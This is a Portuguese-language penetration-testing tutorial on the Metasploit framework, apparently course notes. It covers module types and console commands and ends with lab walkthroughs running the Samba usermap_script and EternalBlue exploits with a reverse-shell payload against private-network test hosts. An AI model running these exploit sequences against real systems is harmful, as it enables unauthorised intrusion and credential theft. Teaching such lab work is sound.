# Explorando vulnerabilidades

Em PenTestes o passo de Explorar Vulnerabilidade, que também pode ser chamado de **Explorar o Alvo**, é o momento de testar todos os *hosts*, portas, serviços e vulnerabilidades encontradas nos passos anteriores. Este passo consiste em verificar efetivamente se é possível invadir o alvo. Se fosse um ataque malicioso, seria o passo em que o *hacker/cracker* iria invadir realmente a vítima, ou seja, para muitos esse passo é o ápice da cibersegurança ou da falta dela.

Então aqui, estera-se utilizar as vulnerabilidades encontradas nos *hosts* visando obter acesso ao alvo, e se possível obter controle total do mesmo, objetivando também descobrir novas partes do sistema (partes que não eram possíveis de visualizar/acessar até invadir o alvo).

Para explorar vulnerabilidades é necessário conhece-las, assim um profissional de cibersegurança sempre deve estar atualizado e à procura de novas vulnerabilidades e como explorá-las. Também, é extremamente recomendável que o PenTester tenha conhecimentos em:
* Programação;
* Engenharia Reversa;
* Sistemas Operacionais;
* Bancos de dados;
* Ferramentas automatizadas;
* etc.

## Metaesploit

No contexto de ferramentas automatizadas, o [Metasploit](https://www.metasploit.com/) é com certeza a ferramenta mais famosa no que se refere à exploração de vulnerabilidades e efetivação em ganhar acesso ao alvo.

O Metaesploit foi desenvolvido na linguagem de programação em [Ruby](https://www.ruby-lang.org/pt/) e na verdade ele é um *framework* (arcabouço). Assim o Metasploit é organizado em três partes:

* **Interface**: é a parte em que o PenTester interage com a ferramenta;

* **Módulos**: é o núcleo do Metaesploit, responsável por executar a parte de exploração de vulnerabilidades e outras funcionalidades que podem ser agregadas à ferramenta;

* **Bibliotecas**:  são as bibliotecas utilizadas para dar suporte aos módulos e interface.

Uma boa maneira de entender/explorar o Metaesploit é navegar na sua estrutura de diretório, tal como:

```console
$ ls /usr/share/metasploit-framework
app     documentation  metasploit-framework.gemspec  msfdb            msfupdate  Rakefile         script-recon
config  Gemfile        modules                       msf-json-rpc.ru  msfvenom   ruby             scripts
data    Gemfile.lock   msfconsole                    msfrpc           msf-ws.ru  script-exploit   tools
db      lib            msfd                          msfrpcd          plugins    script-password  vendor

```

> O caminho para o diretório do Metaesploit pode mudar dependo da distribuição Linux, por exemplo, no Arch Linux ele foi instalado no ``/opt``.

Na estrutura de diretórios apresentada no exemplo anterior, é possível ver, por exemplo o executável da interface (``msfconsole``), o diretório das bibliotecas (``lib``) e dos módulos (``modules``).

Neste contexto, o diretório dos módulos, merece atenção especial, já que é nele que estão presentes as principais funções/ferramentas do Metaesploit. Então, entender sua estrutura é altamente recomendável. A saída a seguir apresenta a estrutura de diretórios do subdiretório ``modules``:

```console
# ls /usr/share/metasploit-framework/modules
auxiliary  encoders  evasion  exploits  nops  payloads  post
```

A partir da saída anterior, é possível notar que há 7 subdiretórios, que por sua vez representam módulos/funcionalidades do Metaesploit.  Cada um desses módulos serão empregados em diferentes fases do PenTeste. Esses módulos/diretórios são:

* **Exploit**: é o módulo que faz a exploração de vulnerabilidades; Há aproximadamente 2.500 *exploits*, em 20 categorias, tais categorias são referentes à software/sistemas existentes, e por exemplo podem ser vistas listando o conteúdo do diretório ``exploits`` (ver saída a seguir);

   ```console
   ls /usr/share/metasploit-framework/modules/exploits
   aix        bsd     example_linux_priv_esc.rb  example_webapp.rb  hpux   mainframe  openbsd  solaris
   android    bsdi    example.py                 firefox            irix   multi      osx      unix
   apple_ios  dialup  example.rb                 freebsd            linux  netware    qnx      windows
   ```
   A decisão de qual *exploit* utilizar, deve estar fundamentada pelo passo de Enumeração do Alvo (passo anterior), ou seja: Sistema Operacional, portas abertas, serviços e versões de softwares.

* **Payload**: esse módulo é responsável por injetar códigos maliciosos que serão submetidos no alvo através do *exploit*. Tais códigos maliciosos serão, por exemplo, os dados enviados (*payload*) dentro de pacotes gerados pelo *exploit*, durante a exploração das vulnerabilidades. Uma boa analogia entre *exploit* e *payload* é feita por SAGAR (2022), que diz que em um paralelo com o mundo real, o *exploit* seria parecido com um míssil e o *payload* seria a carga explosiva do míssil, ou seja, o míssil sem a carga explosiva não vale para muita coisa em uma gerra. Há vários tipos de *payload*, todavia é possível classificá-los basicamente em:

   * **Single** ou **Inline**: são *payloads* autocontidos, tudo que eles precisam estão neles. Isso é bom, mas esses podem ser bem grandes;
   * **Stagers** e **Stages**: Neste tipo, o código a ser executado pelo alvo pode ir em vários estágios, ou seja, em um primeiro momento pode ser enviado um ataque com um *payload* pequeno (chamado *stager*) e no segundo momento, com uma conexão já estabelecida, é enviado um *payload* maior (chamado *the stage*). Normalmente o *stager* é escrito em uma linguagem que gera um binário/executável muito pequeno (ex. *assembly*), assim o *stage* pode ser escrito em outra linguagem.
   > No Metaesploit, um *payload* *single* tem '/' no nome, exemplo: ``windows/shell/reverse_tcp``; já um *staged* possui '_', exemplo: ``windows/shell_reverse_tcp``.

   > Existem mais tipos de *payloads*, para ler respeito desses acesse: <https://www.offensive-security.com/metasploit-unleashed/payload-types/.

* **No Operation** ou **No Operation Performed (NOP)**: são instruções em *assembly* que não fazem nada além de preencher espaços no *payload*, é um *padding*.

* **Encoders**: fornece ao Metaesploit a capacidade de passar despercebido por sistemas de segurança como: antivírus, *firewall*, IDS, etc. Isso é feito cifrando o *payload* durante a exploração. Pegando a analogia do míssil, seria similar à ideia de enviar o míssil em baixa altitude, para ficar a baixo da linha do radar e assim não ser detectado. Então, a função do Encoders é ofuscar o código contido no ataque para que ele não seja detectado por nenhum sistema de segurança instalado no alvo.


* **Post**: contém vários *scripts* e ferramentas para ajudar em tarefas pós-invasão. Essas tarefas podem ser:
   * Escalar privilégios;
   * *OS Credential dumping*, que representa por exemplo, obter *logins* e senhas dos usuários do Sistema Operacional;
   * Roubar senhas salvas e *cookies*;
   * Obter *key logs*;
   * Executar *scripts*;
   * Manter o acesso no alvo.

* **Auxiliaries**: módulo que dá outras funcionalidades ao Metaesploit, tais como: *scan*, *sniffing*, etc. Atualmente há mais de 1.000 módulos auxiliares no Metaesploit.

Agora que foi apresentada a estrutura do Metaesploit fica um pouco mais fácil entender como a ferramenta funciona. As seções seguintes tentaram explicar como utilizar essa poderosa ferramenta (interface e módulos), principalmente com o uso de exemplos.

> O objetivo aqui não é dissertar a respeito de todas as funções do Metaesploit, mas sim apenas fazer uma introdução teórica e prática a respeito deste arcabouço. Então, para informações mais detalhadas leia os livros das referências no final desta página.

### MSFConsole - Interface do Metaesploit

A interação do PenTester com o Metaesploit se dá pelo comando ``msfconsole``, que é a interface do Metaesploit. Assim, após executar tal comando o Pentester estará em um ambiente interativo, tal como mostra a saída a seguir:

```console
# msfconsole
 ______________________________________
/ it looks like you're trying to run a \
\ module                               /
 --------------------------------------
 \
  \
     __
    /  \
    |  |
    @  @
    |  |
    || |/
    || ||
    |\_/|
    \___/


       =[ metasploit v6.2.9-dev                           ]
+ -- --=[ 2230 exploits - 1177 auxiliary - 398 post       ]
+ -- --=[ 867 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: View advanced module options with
advanced

msf6 >

```

Na saída do exemplo anterior, é possível observar a versão do Metaesploit (2.6.9), bem como a quantidade de módulos (*exploits*, *payloads*, etc) e uma bela arte ASCII (tal arte é aleatória).

O ``msfconsole`` parece um pouco complexo e confuso de inicio, mas depois de treinar um pouco a tendencia é que ele seja de fácil interação.

> Podem haver outras interfaces, mas a ``msfconsole`` é a mais utilizada e recomendável.

#### Comando ``help``

Como o Metaesploit é bem vasto (vários módulos e funcionalidades), um comando muito útil é o ``help``, que irá apresentar os comandos e uma pequena descrição desses (ver imagem a seguir).

```console
msf6 > help

Core Commands
=============

    Command       Description
    -------       -----------
    ?             Help menu
    banner        Display an awesome metasploit banner
    cd            Change the current working directory
    color         Toggle color
    connect       Communicate with a host
    debug         Display information useful for debugging
    exit          Exit the console
...
```

Basicamente o comando ``help`` apresenta os comandos divididos da seguintes forma:

* Principais (Core);
* Módulos;
* Tarefas;
* Recursos de *script*;
* Banco de dados do *backend*;
* Credenciais do *backend*;
* Desenvolvimento.

O ``help`` também apresenta alguns exemplos de uso do Metaesploit.


Sabendo os comandos apresentados pelo ``help``, é possível obter mais informações a respeito de opções, parâmetros e exemplos de algum comando específico utilizando a opção ``?`` no final do comando, por exemplo

```console
msf6 > route ?
Route traffic destined to a given subnet through a supplied session.

Usage:
  route [add/remove] subnet netmask [comm/sid]
  route [add/remove] cidr [comm/sid]
  route [get] <host or network>
  route [flush]
  route [print]

Subcommands:
  add - make a new route
  remove - delete a route; 'del' is an alias
  flush - remove all routes
  get - display the route for a given target
  print - show all active routes

Examples:
  Add a route for all hosts from 192.168.0.0 to 192.168.0.255 through session 1
    route add 192.168.0.0 255.255.255.0 1
    route add 192.168.0.0/24 1
...
```
Neste exemplo foi utilizado o comando ``route``, que pode ser utilizado para adicionar/remover/visualizar rodas para redes - isso pode ser útil durante testes.


Também, quando houver dúvida a respeito de como escrever algum comando, é possível utiliza a tecla ``tab`` (no estilo Linux), para autocompletar o comando ou ver os comandos similares. Veja o exemplo a seguir:

```console
msf6 > route
route add     route flush   route get     route print   route remove
```

Neste exemplo, foi digitado o comando ``route`` e depois foram pressionados duas vezes a tecla ``tab``, isso apresentou alguma possibilidades do comando ``route``, tal como ``route add``, para adicionar uma rota para uma rede.


#### Comando ``show``

Outro comando muito útil é o ``show`` que apresenta em mais detalhes as opções e parâmetros que podem ser utilizados em cada módulo. Desta forma, é bem comum utilizar o comando ``show``, com as seguintes opções:

* ``show auxiliary``: mostra o módulo as funções auxiliares disponíveis;

* ``show exploits``: mostra os *exploits* disponíveis;

* ``show payload``: mostra os *payloads* disponíveis. Caso o Pentester já tenha selecionado um *exploit*, serão apresentados apenas os *payloads* suportados por aquele *exploit*;

* ``show encoders``: mostra os *encoders* disponíveis;

* ``show nops``: motra todos os NOPS;

* ``show options``: mostra as opções disponíveis para um dado módulo;

* ``show targets``: mostra as opções de Sistemas Operacionais disponíveis para um dado *exploit*;

* ``show advanced``: apresentará opções avançadas de execução para um dado exploit.

O exemplo a seguir apresenta a saída do comando ``show exploits``:

```console
msf6 > show exploits

Exploits
========

   #     Name                                                                               Disclosure Date  Rank       Check  Description
   -     ----                                                                               ---------------  ----       -----  -----------
   0     exploit/aix/local/ibstat_path                                                      2013-09-24       excellent  Yes    ibstat $PATH Privilege Escalation
   1     exploit/aix/local/xorg_x11_server                                                  2018-10-25       great      Yes    Xorg X11 Server Local Privilege Escalation
   2     exploit/aix/rpc_cmsd_opcode21                                                      2009-10-07       great      No     AIX Calendar Manager Service Daemon (rpc.cmsd) Opcode 21 Buffer Overflow
   3     exploit/aix/rpc_ttdbserverd_realpath                                               2009-06-17       great      No     ToolTalk rpc.ttdbserverd _tt_internal_realpath Buffer Overflow (AIX)
   4     exploit/android/adb/adb_server_exec                                                2016-01-01       excellent  Yes    Android ADB Debug Server Remote Payload Execution
   5     exploit/android/browser/samsung_knox_smdm_url                                      2014-11-12       excellent  No     Samsung Galaxy KNOX Android Browser RCE
   6     exploit/android/browser/stagefright_mp4_tx3g_64bit                                 2015-08-13       normal     No     Android Stagefright MP4 tx3g Integer Overflow
   7     exploit/android/browser/webview_addjavascriptinterface                             2012-12-21       excellent  No     Android Browser and WebView addJavascriptInterface Code Execution
   8     exploit/android/fileformat/adobe_reader_pdf_js_interface                           2014-04-13       good       No     Adobe Reader for Android addJavascriptInterface Exploit
   9     exploit/android/local/binder_uaf                                                   2019-09-26       excellent  No     Android Binder Use-After-Free Exploit
   10    exploit/android/local/futex_requeue                                                2014-05-03       excellent  Yes    Android 'Towelroot' Futex Requeue Kernel Exploit

...
```

Um bom exercício é dar uma boa olhada/lida em todas as saídas geradas pelo comando ``show``, em todos os módulo, isso provavelmente vai de deixar mais confortável no uso do Metaesploit.

<!--
### Comando ``connect``

O comando ``connect`` pode ser utilizado como se fosse um ``telnet`` ou ``netcat``. Assim, é possível se conectar à vítima e executar comandos, por exemplo.

```console
msf6 > connect 192.168.56.108 80
[*] Connected to 192.168.56.108:80 (via: 192.168.56.5:34973)

HTTP/1.1 400 Bad Request
Date: Mon, 12 Sep 2022 18:37:37 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.41 (Ubuntu) Server at 127.0.1.1 Port 80</address>
</body></html>

```

No exemplo anterior foi feita uma conexão ao host 192.168.56.108 para a porta HTTP, depois foi pressionada a tecla ``ENTER``, que retornou um ``Bad Request``, mas que já deu uma pista do servidor HTTP utilizado no alvo.
-->

### Comando ``info``

O comando ``info`` apresenta detalhes a respeito de um módulo específico. Por exemplo podemos ver os módulos do tipo Exploits com o comando ``show`` e escolher um para ver em detalhes com o comando ``info``, tal como é apresentado na saída a seguir:

```console
msf6 > info exploit/windows/ssh/putty_msg_debug

       Name: PuTTY Buffer Overflow
     Module: exploit/windows/ssh/putty_msg_debug
   Platform: Windows
       Arch:
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2002-12-16

Provided by:
  MC <mc@metasploit.com>

Available targets:
  Id  Name
  --  ----
  0   Windows 2000 SP4 English
  1   Windows XP SP2 English
  2   Windows 2003 SP1 English

Check supported:
  No

Basic options:
  Name     Current Setting  Required  Description
  ----     ---------------  --------  -----------
  SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine
                                       or 0.0.0.0 to listen on all addresses.
  SRVPORT  22               yes       The SSH daemon port to listen on
  SSL      false            no        Negotiate SSL for incoming connections
  SSLCert                   no        Path to a custom SSL certificate (default is randomly generated)

Payload information:
  Space: 400
  Avoid: 1 characters

Description:
  This module exploits a buffer overflow in the PuTTY SSH client that
  is triggered through a validation error in SSH.c. This vulnerability
  affects versions 0.53 and earlier.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2002-1359
  OSVDB (8044)
  http://www.rapid7.com/advisories/R7-0009.html
  http://www.securityfocus.com/bid/6407
```
Na saída anterior, são apresentadas informações como:
* Nome do ``exploit``;
* plataforma que ele afeta;
* versões do alvo;
* variáveis que podem ser configuradas para o uso deste (veremos isso a seguir);
* descrição;
* etc.

> Esse comando será muito útil na busca pelo entendimento dos módulos.

### Comando ``search``

Outro comando extremante útil para buscas em módulos do Metaesploit é o ``search``, com ele é possível buscar por palavras em descrições, nomes, caminhos dos módulos do Metaesploit. Para isto basta passar o comando, seguido de um termo de busca, e o resultado será tudo que foi encontrado e está relacionado com o termo utilizado na busca. Veja o exemplo a seguir:

```console
msf6 > search juniper

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank     Check  Description
   -  ----                                                 ---------------  ----     -----  -----------
   0  auxiliary/admin/networking/juniper_config                             normal   No     Juniper Configuration Importer
   1  post/networking/gather/enum_juniper                                   normal   No     Juniper Gather Device General Information
   2  auxiliary/dos/tcp/junos_tcp_opt                                       normal   No     Juniper JunOS Malformed TCP Option
   3  auxiliary/scanner/ssh/juniper_backdoor               2015-12-20       normal   No     Juniper SSH Backdoor Scanner
   4  exploit/windows/browser/juniper_sslvpn_ive_setupdll  2006-04-26       normal   No     Juniper SSL-VPN IVE JuniperSetupDLL.dll ActiveX Control Buffer Overflow
   5  exploit/windows/vpn/safenet_ike_11                   2009-06-01       average  No     SafeNet SoftRemote IKE Service Buffer Overflow


Interact with a module by name or index. For example info 5, use 5 or use exploit/windows/vpn/safenet_ike_11
```
Neste exmplo anterior, foi passado o termo de busca ``juniper``, que e foram retornados 5 resultados. Também é possível realizar a busca utilizando mais de um termo, como no exemplo a seguir:

```console
msf6 > search ssh juniper

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  auxiliary/scanner/ssh/juniper_backdoor  2015-12-20       normal  No     Juniper SSH Backdoor Scanner


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/ssh/juniper_backdoor
```

### Comando ``use``

Após as buscas, é possível informar para o Metaesploit, qual módulo será utilizado para o teste de invasão. Isso é feito utilizando o comando ``use``, seguido do nome completo do módulo, ou do índice (``#``) retornado em uma busca com o comando ``search`` ou ``show``, por exemplo.

Então, imagine que queiramos executar o *scanner* de *backdoor* encontrado na busca do exemplo anterior ``search ssh juniper`` (ver item anterior), com o nome do módulo basta utilizar o comando ``use`` seguido deste nome ``auxiliary/scanner/ssh/juniper_backdoor`` ou do seu indice na busca, que neste caso é o ``0``. Veja a saída a seguir:

```console
msf6 > use auxiliary/scanner/ssh/juniper_backdoor
msf6 auxiliary(scanner/ssh/juniper_backdoor) >
```

No exemplo anterior dá para ver que o comando use carregou o módulo ``scanner/ssh/juniper_backdoor``, que agora está sendo indicado dentro do *prompt* de comando do Metaesploit.

Depois de utilizar o ``use``, já dentro do módulo, é possível executar outros comandos, tais como:

* ``options``  - mostra as opções do módulo, principalmente a questão de variáveis que devem/podem ser configuradas (ver próxima seção);

  > É possível utilizar o comando ``options``, sem escolher um módulo, mas é extremamente comum utilizá-lo dentro do módulo.

* ``check`` - verifica se um *exploit* funciona em um alvo, sem necessariamente explorá-lo - não são todos os módulos que suportam essa opção;

* ``run`` - executa um módulo auxiliar;

* ``exploit`` -  executa um módulo de *exploit*;

* ``back`` - para sair do módulo.

Algumas opções podem estar disponíveis em um módulo e em outro não. Assim, é necessário analisar o módulo e ver suas funções e opções com os comandos ``help`` e principalmente ``info``.


### Variáveis no Metaesploit

Muitos *exploits* do Metaesploit utilizam variáveis para identificar, por exemplo o IP do alvo, portas, etc. Tais variáveis podem ser vistas com o comando ``info``, tal como apresentado anteriormente. Todavia as principais variáveis normalmente são:

* ``LHOST`` - Local Host: indica o IP do *host* que esta fazendo o ataque/teste. Como o *host* do Pentester pode ter mais de uma interface de rede e essa pode ter mais de um endereço IP, pode ser necessário indicar qual IP será utilizado durante os testes;

* ``LPORT`` - Local Port: semelhante ao anterior, mas indica a porta do lado do atacante/teste. Muito utilizado para criar um *shell* reverso durante o ataque/teste;

* ``RHOST`` - Remote Host: Indica o IP do alvo, ou seja, da máquina que receberá o ataque/teste;

* ``RPORT`` - Remote Port: Indica a porta que será atacada/testada, a porta do alvo/vítima.

As variáveis apresentadas anteriormente, bem como outras que podem existir, podem ser manipuladas através dos seguintes comandos:

* ``set``: configura uma variável para o módulo atual;

* ``setg``: configura uma variável, mas de forma global. Ou seja, o valor dela valerá para outros módulos (auxiliares e *exploits*);

* ``unset``: remove o valor de uma variável;

* ``unsetg``: remove o valor de uma variável global;

* ``get``: retorna o valor aplicado em uma variável;

* ``getg``: mesmo que o anterior, mas retorna em nível global.

Todos os comandos anteriores devem ser seguidos da variável que se pretende usar.

Além do comando ``get``, é muito comum utilizar o comando ``options`` para verificar o valor da variável em um dado módulo.

> **Atenção! Alguns módulos exigem que algumas variáveis sejam configuradas. Nestes casos, quando se tenta executar o módulo ele falhará normalmente avisará que é necessário configurar as variáveis**.

O exemplo a seguir apresenta como entrar em um módulo, configurar o valor de uma variável, ver se o valor está correto e executar o módulo:

```console
msf6 > use auxiliary/scanner/ssh/juniper_backdoor
msf6 auxiliary(scanner/ssh/juniper_backdoor) > options

Module options (auxiliary/scanner/ssh/juniper_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metaspl
                                       oit
   RPORT    22               yes       The target port
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/ssh/juniper_backdoor) > set RHOSTS 192.168.56.1
RHOSTS => 192.168.56.1

msf6 auxiliary(scanner/ssh/juniper_backdoor) > options

Module options (auxiliary/scanner/ssh/juniper_backdoor):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS   192.168.56.1     yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metaspl
                                       oit
   RPORT    22               yes       The target port
   THREADS  1                yes       The number of concurrent threads (max one per host)

msf6 auxiliary(scanner/ssh/juniper_backdoor) > run

[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ssh/juniper_backdoor) >
```





### Explorando o Metaesploitable 2.0 Linux

Explorando um *host* Linux com o Metaesploit:

```console
[luiz@fielDACOM ~]$ msfconsole
msf6 > search samba
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set RHOSTS 192.168.56.104
msf6 exploit(multi/samba/usermap_script) > set LHOST 192.168.56.1
msf6 exploit(multi/samba/usermap_script) > exploit
```

Explorando um *host* Windows 8 com o Metaesploit:

```console
# msfconsole
msf6 > use exploit/windows/smb/ms17_010_eternalblue
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.56.3
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.56.112
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
```
Neste caso foi utilizado o *payload* ``windows/x64/meterpreter/reverse_tcp``.

# Referência

* HIMANSHU SHARMA. Kali Linux - An Ethical Hacker’s Cookbook : Over 120 Recipes to Perform Advanced Penetration Testing with Kali Linux. Birmingham, UK: Packt Publishing, 2017. ISBN 9781787121829. Disponível em: <https://search.ebscohost.com/login.aspx?direct=true&db=e000xww&AN=1617212&lang=pt-br&site=eds-live&scope=site>. Acesso em: 26 ago. 2022.

* KEVIN CARDWELL. Building Virtual Pentesting Labs for Advanced Penetration Testing - Second Edition. Birmingham: Packt Publishing, 2016. v. Second editionISBN 9781785883491. Disponível em: <https://search.ebscohost.com/login.aspx?direct=true&db=e000xww&AN=1344064&lang=pt-br&site=eds-live&scope=site>. Acesso em: 31 ago. 2022.

* SAGAR RAHALKAR. Metasploit for Beginners : An Easy to Digest Practical Guide to Metasploit Covering All Aspects of the Framework From Installation, Configuration, and Vulnerability Hunting to Advanced Client Side Attacks and Anti-forensics. Birmingham, UK: Packt Publishing, 2017. ISBN 9781788295970. Disponível em: https://search.ebscohost.com/login.aspx?direct=true&db=e000xww&AN=1560930&lang=pt-br&site=ehost-live. Acesso em: 9 set. 2022.

* <https://redcanary.com/threat-detection-report/techniques/credential-dumping/#:~:text=Credential%20dumping%20is%20the%20process,Movement%20and%20access%20restricted%20information.>

* <https://attack.mitre.org/techniques/T1003/>

* <https://docs.rapid7.com/metasploit/working-with-payloads/>

* <https://www.cobaltstrike.com/blog/staged-payloads-what-pen-testers-should-know/>
